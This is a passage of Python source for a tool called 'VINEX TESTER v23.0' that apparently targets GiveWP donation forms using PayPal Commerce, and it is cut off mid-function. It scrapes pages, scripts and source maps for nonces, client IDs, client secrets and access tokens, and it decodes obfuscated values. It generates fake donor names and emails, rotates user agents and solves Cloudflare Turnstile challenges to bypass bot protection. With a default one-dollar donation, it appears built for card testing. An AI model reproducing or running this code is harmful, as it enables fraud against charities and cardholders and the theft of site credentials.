            cls.b85, cls.a85, cls.url_dec, cls.url_dec_plus, cls.html_ent,
            cls.unicode_esc, cls.rot13, cls.rot47, cls.atbash, cls.reverse,
            cls.jwt_payload, cls.jwt_header, cls.gzip_dec, cls.zlib_dec,
            cls.deflate_dec, cls.brotli_dec, cls.quoted_printable,
            cls.punycode_dec, cls.base64_json,
        ]
        results = [s]
        seen = {s}
        frontier = [s]
        for _ in range(max_depth):
            new_f = []
            for item in frontier:
                for m in methods:
                    try:
                        r = m(item)
                        if isinstance(r, list):
                            for x in r:
                                if x and x not in seen and len(x) > 4:
                                    seen.add(x); results.append(x); new_f.append(x)
                            continue
                        if r and r != item and len(r) > 4 and r not in seen:
                            seen.add(r); results.append(r); new_f.append(r)
                    except: continue
                try:
                    for x in cls.xor_brute(item)[:3]:
                        if x and x not in seen and len(x) > 4:
                            seen.add(x); results.append(x); new_f.append(x)
                except: pass
                try:
                    for x in cls.rot_n(item)[:3]:
                        if x and x not in seen and len(x) > 4:
                            seen.add(x); results.append(x); new_f.append(x)
                except: pass
            if not new_f: break
            frontier = new_f[:30]
        return results

# ═══════════════════════════════════════════════════════════════
#  EXTRACTOR ENGINE v2
# ═══════════════════════════════════════════════════════════════
class ExtractorEngine:
    @staticmethod
    def from_comments(h): return [m.group(1) for m in re.finditer(r'<!--(.*?)-->', h, re.DOTALL)]
    @staticmethod
    def from_data(h): return [m.group(1) for m in re.finditer(r'data-[\w-]+=["\']([^"\']{12,})["\']', h, re.I)]
    @staticmethod
    def from_json_scripts(h):
        return [m.group(1) for m in re.finditer(
            r'<script[^>]*type=["\']application/(?:ld\+)?json["\'][^>]*>(.*?)</script>',
            h, re.DOTALL | re.I)]
    @staticmethod
    def from_js(h):
        return [m.group(1) for m in re.finditer(
            r'<script(?![^>]*\bsrc=)[^>]*>(.*?)</script>', h, re.DOTALL | re.I)]
    @staticmethod
    def from_meta(h): return [m.group(1) for m in re.finditer(r'<meta[^>]+content=["\']([^"\']{12,})["\']', h, re.I)]
    @staticmethod
    def from_onclick(h): return [m.group(1) for m in re.finditer(r'on\w+=["\']([^"\']{12,})["\']', h, re.I)]
    @staticmethod
    def from_class(h):
        out = []
        for m in re.finditer(r'class=["\']([^"\']+)["\']', h, re.I):
            for w in m.group(1).split():
                if len(w) > 40 and re.match(r'^[A-Za-z0-9+/=_-]+$', w): out.append(w)
        return out
    @staticmethod
    def from_style(h): return [m.group(1) for m in re.finditer(r'url\(["\']?([^"\')]+)["\']?\)', h, re.I)]
    @staticmethod
    def from_wp(h):
        out = []
        for pat in [r'window\.wp\w+\s*=\s*(\{.*?\});', r'wpApiSettings\s*=\s*(\{.*?\});',
                    r'_wpnonce["\']?\s*[:=]\s*["\']([^"\']+)["\']']:
            for m in re.finditer(pat, h, re.DOTALL): out.append(m.group(1))
        return out
    @staticmethod
    def from_ajax(h): return [m.group(1) for m in re.finditer(r'["\'](https?://[^"\']+/wp-admin/admin-ajax\.php)["\']', h, re.I)]
    @staticmethod
    def from_rest(h): return [m.group(1) for m in re.finditer(r'["\'](https?://[^"\']+/wp-json/[^"\']+)["\']', h, re.I)]
    @staticmethod
    def from_next(h):
        m = re.search(r'<script[^>]+id=["\']__NEXT_DATA__["\'][^>]*>(.*?)</script>', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_initial(h):
        out = []
        for pat in [r'window\.__INITIAL_STATE__\s*=\s*(\{.*?\});',
                    r'window\.__PRELOADED_STATE__\s*=\s*(\{.*?\});']:
            for m in re.finditer(pat, h, re.DOTALL): out.append(m.group(1))
        return out
    @staticmethod
    def from_b64(h): return [m.group(1) for m in re.finditer(r'["\']([A-Za-z0-9+/]{40,}={0,2})["\']', h)]
    @staticmethod
    def from_hex(h): return [m.group(1) for m in re.finditer(r'["\']([0-9a-fA-F]{40,})["\']', h)]
    @staticmethod
    def from_srcset(h):
        out = []
        for m in re.finditer(r'srcset=["\']([^"\']+)["\']', h, re.I):
            for part in m.group(1).split(','):
                u = part.strip().split(' ')[0]
                if u: out.append(u)
        return out
    @staticmethod
    def from_link(h):
        out = []
        for m in re.finditer(r'<link[^>]+href=["\']([^"\']+)["\']', h, re.I):
            out.append(m.group(1))
        return out
    @staticmethod
    def from_iframe(h):
        out = []
        for m in re.finditer(r'<iframe[^>]+srcdoc=["\']([^"\']+)["\']', h, re.I):
            out.append(html.unescape(m.group(1)))
        return out
    @staticmethod
    def from_template(h):
        return [m.group(1) for m in re.finditer(r'<template[^>]*>(.*?)</template>', h, re.DOTALL | re.I)]
    @staticmethod
    def from_shadow(h):
        return [m.group(1) for m in re.finditer(r'attachShadow\s*\(\s*\{[^}]*mode\s*:\s*["\']([^"\']+)', h)]
    @staticmethod
    def from_webpack(h):
        out = []
        for pat in [r'__webpack_require__', r'webpackChunk\w*', r'webpackJsonp']:
            for m in re.finditer(pat, h):
                start = max(0, m.start() - 200)
                out.append(h[start:m.end() + 200])
        return out
    @staticmethod
    def from_nuxt(h):
        m = re.search(r'window\.__NUXT__\s*=\s*(.*?);\s*</script>', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_astro(h):
        return [m.group(1) for m in re.finditer(r'astro-island[^>]*props=["\']([^"\']+)["\']', h, re.I)]
    @staticmethod
    def from_svelte(h):
        m = re.search(r'__sveltekit[^=]*=\s*(\{.*?\});', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_remix(h):
        m = re.search(r'window\.__remixContext\s*=\s*(\{.*?\});', h, re.DOTALL)
        return [m.group(1)] if m else []
    @staticmethod
    def from_gatsby(h):
        return [m.group(1) for m in re.finditer(r'page-data\.json[^"\']*', h)]
    @staticmethod
    def from_pp_sdk(h):
        out = []
        for m in re.finditer(r'paypal\.com/sdk/js\?([^"\']+)', h, re.I):
            out.append(m.group(1))
        return out
    @staticmethod
    def from_braintree(h):
        return [m.group(1) for m in re.finditer(r'data-client-token=["\']([^"\']+)["\']', h, re.I)]
    @staticmethod
    def from_stripe(h):
        return [m.group(1) for m in re.finditer(r'pk_(?:live|test)_[A-Za-z0-9]{20,}', h, re.I)]
    @staticmethod
    def from_grecaptcha(h):
        out = []
        for m in re.finditer(r'data-sitekey=["\']([A-Za-z0-9_-]{20,})["\']', h, re.I):
            out.append(m.group(1))
        return out
    @staticmethod
    def from_cf(h):
        out = []
        for pat in [r'challenges\.cloudflare\.com/turnstile/v0/api\.js\?render=([A-Za-z0-9_-]+)',
                    r'cf-turnstile[^>]*data-sitekey=["\']([A-Za-z0-9_-]+)["\']',
                    r'data-sitekey=["\'](0x[A-Za-z0-9_-]{10,})["\']']:
            for m in re.finditer(pat, h, re.I):
                out.append(m.group(1))
        return out
    @staticmethod
    def from_give_vars(h):
        out = []
        for pat in [r'give_global_vars\s*=\s*(\{.*?\});',
                    r'give_paypal_commerce\s*=\s*(\{.*?\});',
                    r'give_stripe_vars\s*=\s*(\{.*?\});',
                    r'give_ajax_object\s*=\s*(\{.*?\});']:
            for m in re.finditer(pat, h, re.DOTALL):
                out.append(m.group(1))
        return out
    @staticmethod
    def from_pp_direct(h):
        return [m.group(1) for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', h)]

    @classmethod
    def extract_all(cls, h):
        seen = set(); out = []
        passes = [
            ('comment', cls.from_comments),
            ('data', cls.from_data),
            ('json', cls.from_json_scripts),
            ('js', cls.from_js),
            ('meta', cls.from_meta),
            ('onclick', cls.from_onclick),
            ('class', cls.from_class),
            ('style', cls.from_style),
            ('wp', cls.from_wp),
            ('ajax', cls.from_ajax),
            ('rest', cls.from_rest),
            ('next', cls.from_next),
            ('initial', cls.from_initial),
            ('b64', cls.from_b64),
            ('hex', cls.from_hex),
            ('srcset', cls.from_srcset),
            ('link', cls.from_link),
            ('iframe', cls.from_iframe),
            ('template', cls.from_template),
            ('shadow', cls.from_shadow),
            ('webpack', cls.from_webpack),
            ('nuxt', cls.from_nuxt),
            ('astro', cls.from_astro),
            ('svelte', cls.from_svelte),
            ('remix', cls.from_remix),
            ('gatsby', cls.from_gatsby),
            ('pp_sdk', cls.from_pp_sdk),
            ('braintree', cls.from_braintree),
            ('stripe', cls.from_stripe),
            ('grecaptcha', cls.from_grecaptcha),
            ('cf', cls.from_cf),
            ('give_vars', cls.from_give_vars),
            ('pp_direct', cls.from_pp_direct),
        ]
        for name, fn in passes:
            try:
                for chunk in fn(h):
                    if not chunk or len(chunk) < 8: continue
                    key = chunk[:200]
                    if key in seen: continue
                    seen.add(key)
                    out.append({'source': name, 'content': chunk})
            except: continue
        return out

# ═══════════════════════════════════════════════════════════════
#  VINEX TESTER v23.0
# ═══════════════════════════════════════════════════════════════
FIRST_NAMES = ['James', 'John', 'Robert', 'Michael', 'William', 'David',
               'Daniel', 'Matthew', 'Christopher', 'Andrew']
LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller',
              'Davis', 'Garcia', 'Rodriguez', 'Wilson']

class VinexTester:
    def __init__(self, url):
        url = safe_url(url) or 'https://invalid.local/'
        self.page_url = url
        try:
            p = urlparse(url)
            self.url = p.netloc or 'invalid.local'
            self.inurl = p.path or '/'
            if p.query: self.inurl += '?' + p.query
        except Exception:
            self.url = 'invalid.local'; self.inurl = '/'

        self.paypal = None
        self.client_id = None
        self.client_secret = None
        self.donation = '1.00'
        self.minimum = '5.00'
        self.currency = 'USD'
        self.price_levels = []
        self.id_form1 = None
        self.id_form2 = None
        self.nonce = None
        self.wp_nonce = None
        self.au = None
        self.ajax_url = None
        self.current_price_id = None
        self.page_html = ''
        self.all_content = ''
        self.auth_method = 'none'
        self.gateway_type = 'unknown'
        self.form_fields = {}
        self.email = f'{random.choice(FIRST_NAMES)}{random.randint(100, 999)}@gmail.com'
        self.r = requests.Session(); self.r.verify = True
        self.r.headers.update({
            'user-agent': rand_ua(),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
        })
        self.uu = type('U', (), {'random': property(lambda s: rand_ua())})()
        self.diagnostics = []
        self.token_candidates = []
        self.token_verified = False
        self._warmed = False
        self.cf_detected = False
        self.cf_sitekey = None
        self.cf_solved = False
        self.tier_used = None
        self.last_order_id = None
        self.last_order_status = None
        self.last_capture_id = None
        self.attempt_log = []

    def _log(self, m):
        try: self.diagnostics.append(f'{time.time():.2f} {m}')
        except: pass

    def _safe_get(self, url, timeout=15, headers=None):
        try:
            if not url or not isinstance(url, str): return None
            if not url.startswith(('http://', 'https://')): return None
            if '://none' in url.lower(): return None
            return self.r.get(url, timeout=timeout, headers=headers or {})
        except Exception:
            return None

    def _safe_post(self, url, **kwargs):
        try:
            if not url or not isinstance(url, str): return None
            if not url.startswith(('http://', 'https://')): return None
            return self.r.post(url, timeout=kwargs.pop('timeout', 20), **kwargs)
        except Exception:
            return None

    def _build_url(self, base, path):
        try:
            if not base or not path: return None
            if path.startswith('//'): return 'https:' + path
            if path.startswith('/'): return f'https://{base}{path}'
            if not path.startswith('http'): return f'https://{base}/{path}'
            return path
        except Exception:
            return None

    # ─── Cloudflare detection ───
    def _detect_cloudflare(self):
        try:
            c = (self.all_content or '') + '\n' + (self.page_html or '')
            markers = [
                'challenges.cloudflare.com',
                'cf-turnstile',
                'turnstile.render',
                'cf-chl-widget',
                '_cf_chl_opt',
                'cf-challenge',
                'data-sitekey',
            ]
            if not any(m in c for m in markers):
                return False
            self._log('Cloudflare markers found')
            for pat in [
                r'data-sitekey=["\'](0x[A-Za-z0-9_-]{10,})["\']',
                r'sitekey["\']?\s*[:=]\s*["\'](0x[A-Za-z0-9_-]{10,})["\']',
                r'turnstile[^"\'<>]*["\'](0x[A-Za-z0-9_-]{10,})["\']',
                r'["\'](0x4AAAAAA[A-Za-z0-9_-]{10,})["\']',
            ]:
                m = re.search(pat, c)
                if m:
                    self.cf_sitekey = m.group(1)
                    self._log(f'sitekey: {self.cf_sitekey[:25]}...')
                    break
            return True
        except Exception:
            return False

    def _solve_cloudflare(self):
        if not self.cf_detected: return False
        if not _turnstile.enabled:
            self._log('Cloudflare but solver disabled')
            return False
        if not self.cf_sitekey:
            self._log('Cloudflare but no sitekey')
            return False
        self._log('Solving Cloudflare Turnstile...')
        token = _turnstile.solve(self.page_url, self.cf_sitekey)
        if not token: return False
        try:
            self.r.cookies.set('cf_clearance', token, domain=self.url)
            self._log('cf_clearance set')
            self.cf_solved = True
            return True
        except Exception as e:
            self._log(f'cookie set err: {e}')
            return False

    def _warmup_session(self):
        try:
            if self._warmed: return True
            self.r.get(f'https://{self.url}/', timeout=15, headers={'referer': f'https://{self.url}/'})
            time.sleep(0.3)
            self.r.get(self.page_url, timeout=20, headers={'referer': f'https://{self.url}/'})
            self._warmed = True
            return True
        except Exception:
            return False

    def _fetch_page(self):
        for _ in range(2):
            try:
                r = self._safe_get(self.page_url, timeout=20, headers={'referer': f'https://{self.url}/'})
                if r and r.status_code == 200 and r.text:
                    self.page_html = r.text
                    self.all_content = r.text
                    return True
            except Exception:
                pass
            time.sleep(0.3)
        return False

    def _load_iframes(self):
        try:
            if not self.page_html: return
            pat = r'<iframe[^>]*src=["\']([^"\']*(?:give|donation|form|checkout)[^"\']*)["\']'
            for m in re.finditer(pat, self.page_html, re.I):
                try:
                    full = self._build_url(self.url, m.group(1))
                    if not full: continue
                    r = self._safe_get(full, timeout=12)
                    if r and r.status_code == 200 and r.text:
                        self.all_content += '\n' + r.text
                except Exception:
                    continue
        except Exception:
            pass

    def _load_all_js(self):
        try:
            if not self.page_html: return
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
            prio = [u for u in js_urls if any(k in u.lower() for k in
                    ('give', 'donation', 'paypal', 'commerce', 'token', 'client'))]
            ordered = (prio + [u for u in js_urls if u not in prio])[:20]
            for js_url in ordered:
                try:
                    full = self._build_url(self.url, js_url)
                    if not full: continue
                    r = self._safe_get(full, timeout=6)
                    if r and r.status_code == 200 and r.text:
                        self.all_content += '\n' + r.text
                except Exception:
                    continue
        except Exception:
            pass

    def _extract_from_headers(self):
        try:
            r = self._safe_get(self.page_url, timeout=15)
            if not r: return
            for h, v in r.headers.items():
                hl = h.lower()
                if 'x-wp-nonce' in hl or 'x-csrf' in hl or 'x-give' in hl:
                    if not self.wp_nonce: self.wp_nonce = v.strip()
            for ck in r.cookies:
                if 'nonce' in ck.name.lower() and not self.wp_nonce:
                    self.wp_nonce = ck.value
        except Exception:
            pass

    def _try_wp_json(self):
        for ep in ['/wp-json/', '/wp-json/give-api/v1/forms', '/wp-json/wp/v2/types',
                   '/wp-json/give-api/v1/forms/']:
            try:
                r = self._safe_get(f'https://{self.url}{ep}', timeout=6)
                if r and r.status_code == 200 and r.text:
                    self.all_content += '\n' + r.text
            except Exception:
                continue

    def _extract_js_sourcemaps(self):
        try:
            if not self.page_html: return
            js_urls = re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', self.page_html)
            for u in js_urls[:5]:
                try:
                    map_url = u + '.map'
                    if map_url.startswith('//'): map_url = 'https:' + map_url
                    elif map_url.startswith('/'): map_url = f'https://{self.url}{map_url}'
                    elif not map_url.startswith('http'): map_url = f'https://{self.url}/{map_url}'
                    r = self._safe_get(map_url, timeout=4)
                    if r and r.status_code == 200 and len(r.text) > 500:
                        self.all_content += '\n' + r.text[:50000]
                except Exception:
                    continue
        except Exception:
            pass

    def _probe_sw(self):
        for path in ('/sw.js', '/service-worker.js', '/manifest.json',
                     '/robots.txt', '/sitemap.xml', '/.well-known/security.txt'):
            try:
                r = self._safe_get(f'https://{self.url}{path}', timeout=4)
                if r and r.status_code == 200 and r.text and len(r.text) < 200000:
                    self.all_content += '\n' + r.text
            except Exception:
                continue

    def _deep_js_analysis(self):
        try:
            c = self.all_content
            if not c: return

            for m in re.finditer(r'wpApiSettings\s*=\s*\{([^}]+)\}', c):
                nm = re.search(r'"nonce"\s*:\s*"([^"]+)"', m.group(1))
                if nm and not self.wp_nonce: self.wp_nonce = nm.group(1)

            for m in re.finditer(r'give_global_vars\s*=\s*\{', c):
                start = m.end() - 1; depth = 0; end = start
                for i in range(start, min(len(c), start + 5000)):
                    if c[i] == '{': depth += 1
                    elif c[i] == '}':
                        depth -= 1
                        if depth == 0: end = i + 1; break
                block = c[start:end]
                nm = re.search(r'"nonce"\s*:\s*"([^"]+)"', block)
                if nm and not self.nonce: self.nonce = nm.group(1)
                am = re.search(r'"ajax"\s*:\s*"([^"]+)"', block)
                if am and not self.ajax_url: self.ajax_url = am.group(1).replace('\\/', '/')

            for m in re.finditer(r'give_paypal_commerce\s*=\s*\{', c):
                start = m.end() - 1; depth = 0; end = start
                for i in range(start, min(len(c), start + 5000)):
                    if c[i] == '{': depth += 1
                    elif c[i] == '}':
                        depth -= 1
                        if depth == 0: end = i + 1; break
                block = c[start:end]
                for key in ['clientToken', 'client_token', 'accessToken', 'access_token']:
                    tm = re.search(rf'"?{key}"?\s*:\s*"([^"]+)"', block)
                    if tm: self._add_candidate(tm.group(1), f'js:{key}')
                cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', block)
                if cm and not self.client_id: self.client_id = cm.group(1)
                sm = re.search(r'"clientSecret"\s*:\s*"([^"]+)"', block)
                if sm and not self.client_secret: self.client_secret = sm.group(1)
                mm = re.search(r'"merchantId"\s*:\s*"([^"]+)"', block)
                if mm and not self.paypal: self.paypal = mm.group(1)

            for m in re.finditer(r'paypal\.com/sdk/js\?([^"\']+)', c, re.I):
                q = dict(parse_qsl(m.group(1)))
                if q.get('client-id') and not self.client_id:
                    self.client_id = q['client-id']
                if q.get('merchant-id') and not self.paypal:
                    self.paypal = q['merchant-id']
                if q.get('currency') and q['currency'] != self.currency:
                    self.currency = q['currency'].upper()

            if not self.client_id:
                for p in [r'client-id=["\']([A-Za-z0-9_-]{20,})["\']',
                          r'"clientId"\s*:\s*"([A-Za-z0-9_-]{20,})"',
                          r'client_id["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']']:
                    m = re.search(p, c, re.I)
                    if m: self.client_id = m.group(1); break

            if not self.paypal:
                for p in [r'merchant-id=["\']([A-Za-z0-9]+)["\']',
                          r'"merchantId"\s*:\s*"([A-Za-z0-9]+)"',
                          r'merchant_id["\']?\s*[:=]\s*["\']([A-Za-z0-9]+)["\']']:
                    m = re.search(p, c, re.I)
                    if m: self.paypal = m.group(1); break

            if not self.client_secret:
                for p in [r'client_secret["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{30,})["\']',
                          r'"clientSecret"\s*:\s*"([A-Za-z0-9_-]{30,})"']:
                    m = re.search(p, c, re.I)
                    if m: self.client_secret = m.group(1); break
        except Exception:
            pass

    def _extract_basic(self):
        try:
            c = self.all_content
            if not c: return

            for p in [r'name="give-form-id-prefix"\s+value="([^"]+)"',
                      r'"give-form-id-prefix"\s*:\s*"([^"]+)"',
                      r'data-form-id-prefix=["\']([^"\']+)["\']']:
                m = re.search(p, c)
                if m: self.id_form1 = m.group(1); break

            for p in [r'name="give-form-id"\s+value="(\d+)"',
                      r'"give-form-id"\s*:\s*"?(\d+)"?',
                      r'data-form-id=["\'](\d+)["\']',
                      r'give-form-(\d+)-']:
                m = re.search(p, c)
                if m: self.id_form2 = m.group(1); break

            if not self.nonce:
                for p in [r'name="give-form-hash"\s+value="([^"]+)"',
                          r'"give-form-hash"\s*:\s*"([^"]+)"',
                          r'"nonce"\s*:\s*"([a-f0-9]{8,32})"',
                          r'name="_wpnonce"\s+value="([^"]+)"']:
                    m = re.search(p, c)
                    if m: self.nonce = m.group(1); break

            for p in [r'name="give-form-minimum"\s+value="([^"]*)"',
                      r'"give-form-minimum"\s*:\s*"([^"]*)"',
                      r'"minimum_price"\s*:\s*"?([\d.]+)"?']:
                m = re.search(p, c)
                if m and m.group(1).strip(): self.minimum = m.group(1).strip(); break

            for p in [r'name="give-currency"\s+value="([A-Za-z]{3})"',
                      r'"give-currency"\s*:\s*"([A-Za-z]{3})"',
                      r'"currency"\s*:\s*"([A-Za-z]{3})"',
                      r'data-currency=["\']([A-Za-z]{3})["\']']:
                m = re.search(p, c, re.I)
                if m: self.currency = m.group(1).upper(); break

            self.price_levels = []
            seen = set()

            def _add(pid, amt):
                try:
                    amt_f = float(str(amt).replace(',', ''))
                    pid_s = str(pid).strip()
                    if pid_s and amt_f > 0 and (pid_s, amt_f) not in seen:
                        seen.add((pid_s, amt_f))
                        self.price_levels.append((pid_s, amt_f))
                except Exception:
                    pass

            for m in re.finditer(
                r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']',
                c, re.I):
                _add(m.group(1), m.group(2))
            for m in re.finditer(
                r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']',
                c, re.I):
                _add(m.group(2), m.group(1))
            for m in re.finditer(
                r'<input[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\'][^>]*data-price=["\']([\d.]+)["\']',
                c, re.I):
                _add(m.group(1), m.group(2))
            for m in re.finditer(
                r'<select[^>]*name=["\']give-price-id["\'][^>]*>(.*?)</select>',
                c, re.DOTALL | re.I):
                inner = m.group(1)
                for om in re.finditer(
                    r'<option[^>]*value=["\']([^"\']+)["\'][^>]*data-price=["\']([\d.]+)["\']',
                    inner):
                    _add(om.group(1), om.group(2))
                for om in re.finditer(
                    r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>([^<]*[\d.,]+[^<]*)</option>',
                    inner):
                    try:
                        pm = re.search(r'[\d]+[.,]?[\d]*', om.group(2))
                        if pm: _add(om.group(1), pm.group(0).replace(',', ''))
                    except Exception:
                        pass
            for m in re.finditer(
                r'<button[^>]*data-price-id=["\']([^"\']+)["\'][^>]*>([^<]*)</button>',
                c, re.I):
                try:
                    pm = re.search(r'\$\s*([\d.,]+)', m.group(2))
                    if pm: _add(m.group(1), pm.group(1).replace(',', ''))
                except Exception:
                    pass
            for pat in [r'"price-options"\s*:\s*\[(.*?)\]',
                        r'"prices"\s*:\s*\[(.*?)\]',
                        r'"priceLevels"\s*:\s*\[(.*?)\]']:
                for m in re.finditer(pat, c, re.DOTALL):
                    inner = m.group(1)
                    for om in re.finditer(
                        r'\{[^{}]*?"(?:_give_price_id|price_id|id|_give_id)"\s*:\s*["\']?([^"\',\}\s]+)["\']?[^{}]*?"(?:_give_amount|amount|price|_give_price)"\s*:\s*["\']?([\d.]+)["\']?',
                        inner):
                        _add(om.group(1), om.group(2))
            for m in re.finditer(r'"give-price-id"\s*:\s*"([^"]+)"', c):
                pid = m.group(1)
                if pid and pid not in ('custom', '0'):
                    start = max(0, m.start() - 200)
                    nearby = c[start:m.end() + 200]
                    pm = re.search(r'["\']?(?:amount|price)["\']?\s*:\s*["\']?([\d.]+)', nearby)
                    if pm: _add(pid, pm.group(1))

            self.price_levels = sorted(self.price_levels, key=lambda x: x[1])

            for p in [
                r'<input[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\'][^>]*checked',
                r'<input[^>]*checked[^>]*name=["\']give-price-id["\'][^>]*value=["\']([^"\']+)["\']',
                r'<button[^>]*data-price-id=["\']([^"\']+)["\'][^>]*class=["\'][^"\']*(?:active|selected)[^"\']*',
                r'<li[^>]*data-price-id=["\']([^"\']+)["\'][^>]*class=["\'][^"\']*(?:active|selected)[^"\']*',
            ]:
                m = re.search(p, c, re.I)
                if m: self.current_price_id = m.group(1); break

            if not self.price_levels and self.ajax_url and self.id_form2:
                try:
                    r = self._safe_post(self.ajax_url,
                        data={'action': 'give_get_form_price_options',
                              'form_id': self.id_form2, 'give-form-id': self.id_form2},
                        headers={'x-requested-with': 'XMLHttpRequest',
                                 'user-agent': self.uu.random,
                                 'referer': self.page_url}, timeout=8)
                    if r and r.status_code == 200:
                        j = r.json()
                        data = j.get('data') if isinstance(j, dict) else None
                        if isinstance(data, list):
                            for item in data:
                                if isinstance(item, dict):
                                    pid = item.get('_give_price_id') or item.get('price_id') or item.get('id')
                                    amt = item.get('_give_amount') or item.get('amount') or item.get('price')
                                    if pid and amt: _add(pid, str(amt).replace(',', ''))
                except Exception:
                    pass

            if 'admin-ajax.php' in c and not self.ajax_url:
                self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        except Exception:
            pass

    def _extract_all_form_fields(self):
        try:
            c = self.all_content
            if not c: return
            self.form_fields = {}
            for m in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>',
                                  c, re.DOTALL | re.I):
                try:
                    name = m.group(1); inner = m.group(2); tag = m.group(0)
                    required = 'required' in tag.lower()
                    opts = [om.group(1).strip() for om in
                            re.finditer(r'<option[^>]*value=["\']([^"\']*)["\'][^>]*>', inner)
                            if om.group(1).strip()]
                    self.form_fields[name] = {'type': 'select', 'required': required, 'options': opts}
                except Exception:
                    continue
            radio = {}
            for m in re.finditer(r'<input[^>]*type=["\']radio["\'][^>]*>', c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    vm = re.search(r'value=["\']([^"\']*)["\']', tag)
                    if nm and vm:
                        name = nm.group(1); val = vm.group(1)
                        if name not in radio:
                            radio[name] = {'required': 'required' in tag.lower(), 'options': []}
                        if val and val not in radio[name]['options']:
                            radio[name]['options'].append(val)
                except Exception:
                    continue
            for name, info in radio.items():
                self.form_fields[name] = {'type': 'radio', 'required': info['required'],
                                           'options': info['options']}
            for m in re.finditer(r'<input[^>]*type=["\'](text|email|tel|number|date)["\'][^>]*>',
                                  c, re.I):
                try:
                    tag = m.group(0)
                    nm = re.search(r'name=["\']([^"\']+)["\']', tag)
                    if nm and nm.group(1) not in self.form_fields:
                        self.form_fields[nm.group(1)] = {
                            'type': m.group(1).lower(),
                            'required': 'required' in tag.lower(),
                            'options': []}
                except Exception:
                    continue
        except Exception:
            pass

    def _resolve_dropdown_options(self):
        try:
            for name, info in list(self.form_fields.items()):
                if info.get('options'):
                    info['options'] = [o for o in info['options'] if is_valid_option(o)]
                if info.get('type') != 'select' or info.get('options') or not info.get('required'):
                    continue
                if self.ajax_url and self.id_form2:
                    try:
                        r = self._safe_post(self.ajax_url,
                            data={'action': 'give_get_form_field_options',
                                  'field_name': name, 'form_id': self.id_form2}, timeout=6)
                        if r and r.status_code == 200:
                            j = r.json()
                            if isinstance(j.get('data'), list) and j['data']:
                                valid = [o for o in j['data'] if is_valid_option(o)]
                                if valid: info['options'] = valid; continue
                    except Exception:
                        pass
                info['required'] = False
        except Exception:
            pass

    def _resolve_special_fields(self):
        try:
            country = 'US'
            for f in ('billing_country', 'give_country', 'country'):
                if f in self.form_fields:
                    opts = [o for o in self.form_fields[f].get('options', []) if is_valid_option(o)]
                    if opts: country = opts[0]; break
            special = {
                'last_4_digits_nricfin': str(random.randint(1000, 9999)),
                'contact_number_to_collect': ('+6581234567' if country == 'SG' else '+1234567890'),
            }
            for name, val in special.items():
                if name in self.form_fields:
                    self.form_fields[name]['prefill'] = val
        except Exception:
            pass

    def _add_candidate(self, token, source):
        if not token or len(token) < 20: return
        for c in self.token_candidates:
            if c['token'] == token: return
        self.token_candidates.append({'token': token, 'source': source})

    def _extract_tokens_from_text(self, text, source):
        try:
            for m in re.finditer(r'"accessToken"\s*:\s*"([^"]+)"', text, re.I):
                self._add_candidate(m.group(1), source)
            for m in re.finditer(r'"access_token"\s*:\s*"([^"]+)"', text, re.I):
                self._add_candidate(m.group(1), source)
            mm = re.search(r'merchant_id=([\w]+)', text)
            if mm and not self.paypal: self.paypal = mm.group(1)
            cm = re.search(r'"clientId"\s*:\s*"([^"]+)"', text)
            if cm and not self.client_id: self.client_id = cm.group(1)
            for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', text):
                self._add_candidate(m.group(1), f'{source}-A21')
            if 50 < len(text) < 400 and ' ' not in text and any(text.startswith(p) for p in ('A21', 'eyJ')):
                self._add_candidate(text, f'{source}-long')
        except Exception:
            pass

    def _extract_tokens_ultimate(self):
        try:
            c = self.all_content
            if not c: return False
            chunks = ExtractorEngine.extract_all(c)
            self._log(f'passes: {len(chunks)}')
            for chunk in chunks:
                try:
                    t = chunk['content']
                    self._extract_tokens_from_text(t, chunk['source'])
                    if any(x in t for x in '=+/_') and len(t) < 2000:
                        for d in DecodeEngine.decode_chain(t, max_depth=3)[:5]:
                            self._extract_tokens_from_text(d, f"{chunk['source']}+dec")
                except Exception:
                    continue
            for m in re.finditer(r'\b(A21[A-Za-z0-9+/=_-]{40,})\b', c):
                self._add_candidate(m.group(1), 'A21')
            for m in re.finditer(r'\b(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)\b', c):
                raw = m.group(1); self._add_candidate(raw, 'jwt')
                pj = DecodeEngine.jwt_payload(raw)
                if pj:
                    try:
                        j = json.loads(pj)
                        if 'accessToken' in j: self._add_candidate(j['accessToken'], 'jwt-AT')
                        if 'clientId' in j and not self.client_id: self.client_id = j['clientId']
                        if 'merchant_id' in j and not self.paypal: self.paypal = j['merchant_id']
                    except Exception:
                        pass
            for pat in [r'"data-client-token"\s*:\s*"([^"]+)"',
                        r'data-client-token=["\']([^"\']+)["\']',
                        r'"clientToken"\s*:\s*"([^"]+)"']:
                for m in re.finditer(pat, c, re.I):
                    raw = m.group(1)
                    if len(raw) > 20: self._add_candidate(raw, 'direct')
                    for d in DecodeEngine.decode_chain(raw, max_depth=4):
                        self._extract_tokens_from_text(d, 'dec-chain')
            for m in re.finditer(r'"accessToken"\s*:\s*"([^"]+)"', c, re.I):
                if len(m.group(1)) > 20: self._add_candidate(m.group(1), 'direct-AT')
            if not self.client_id:
